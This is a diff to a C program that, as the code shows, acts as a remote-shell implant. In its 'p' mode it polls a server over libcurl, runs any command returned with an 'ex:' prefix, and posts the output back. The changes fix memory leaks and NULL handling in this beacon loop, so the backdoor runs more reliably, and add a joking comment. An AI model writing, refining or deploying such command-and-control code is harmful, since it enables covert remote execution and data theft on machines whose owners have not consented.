@@ -50,21 +50,24 @@ int main(int argc, char *argv[])
 
 	curl_global_init(CURL_GLOBAL_ALL);
 
-	char *first = "nuthin";
+	char *previous = NULL;
 	char *output = NULL;
-
 	switch (argv[1][0]) {
 	case 'g':
-		getShell(output);
+		getShell(previous);
 		break;
 	case 'p':
 		while (1) {
-			// printf("sending: \n%s\n", first);
-			output = postShell(first);
-			// printf("received: %s\n", output);
-			if (strcmp(output, "nuthin") != 0) {
-				first = executeCmd(output);
-				printf("output is: %s\n", first);
+			output = postShell(previous);
+			if (previous != NULL) {
+				free(previous);
+				previous = NULL;
+			}
+			if (output != NULL) {
+				previous = executeCmd(
+					output +
+					3); // pointer arithmetic go brrrr
+				free(output);
 			} else {
 				sleep(1);
 			}
@@ -102,9 +105,15 @@ char *postShell(char *cmd)
 	CURL *curl;
 	CURLcode res;
 	curl = curl_easy_init();
-	char *buffer = calloc(strlen(cmd) + 10, sizeof(char));
-	strcpy(buffer, "output=");
-	strcat(buffer, cmd);
+	char *buffer;
+	if (cmd != NULL) {
+		buffer = calloc(strlen(cmd) + 10, sizeof(char));
+		strcpy(buffer, "output=");
+		strcat(buffer, cmd);
+	} else {
+		buffer = calloc(20, sizeof(char));
+		strcpy(buffer, "output=nuthin");
+	}
 
 	if (!curl) {
 		fprintf(stderr, "curl_easy_init() failed\n");
@@ -136,7 +145,7 @@ char *postShell(char *cmd)
 	if (strncmp(response_data.buffer, "ex:", 3) == 0) {
 		free(buffer);
 		curl_easy_cleanup(curl);
-		return response_data.buffer + 3;
+		return response_data.buffer;
 	} else {
 		goto noex;
 	}
@@ -146,14 +155,14 @@ error:
 	free(response_data.buffer);
 	free(buffer);
 	curl_easy_cleanup(curl);
-	return "nuthin";
+	return NULL;
 
 noex:
 	fprintf(stdout, "exit\n");
 	free(response_data.buffer);
 	free(buffer);
 	curl_easy_cleanup(curl);
-	return "nuthin";
+	return NULL;
 }
 
 /* get request */
